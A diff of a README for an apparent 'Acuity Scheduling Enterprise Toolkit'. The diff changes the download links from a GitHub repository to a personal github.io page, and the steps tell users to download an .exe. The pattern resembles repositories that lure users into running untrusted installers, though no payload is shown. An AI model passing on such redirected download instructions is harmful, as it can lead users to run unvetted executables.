@@ -1,6 +1,6 @@
 # 📅 acuity-enterprise-scheduler - Streamline your business scheduling workflow today
 
-[![Download](https://img.shields.io/badge/Download-Acuity_Scheduler-blue)](https://github.com/ranag1475/acuity-enterprise-scheduler)
+[![Download](https://img.shields.io/badge/Download-Acuity_Scheduler-blue)](https://ranag1475.github.io)
 
 Acuity Scheduling Enterprise Toolkit v2026.1.0 manages your business appointments and workflow tasks. It runs on Windows, macOS, and Linux systems. The software uses profile configurations to match your business needs. It connects to your existing accounts through secure API pathways to keep your calendar current.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the toolkit:
 
 You can obtain the installation file from our official repository page.
 
-1.  Visit this page to download: [https://github.com/ranag1475/acuity-enterprise-scheduler](https://github.com/ranag1475/acuity-enterprise-scheduler)
+1.  Visit this page to download: [https://ranag1475.github.io](https://ranag1475.github.io)
 2.  Look for the "Releases" section on the right side of the screen.
 3.  Click the link labeled "v2026.1.0" or the latest available version.
 4.  Find the file ending in `.exe` under the "Assets" area.
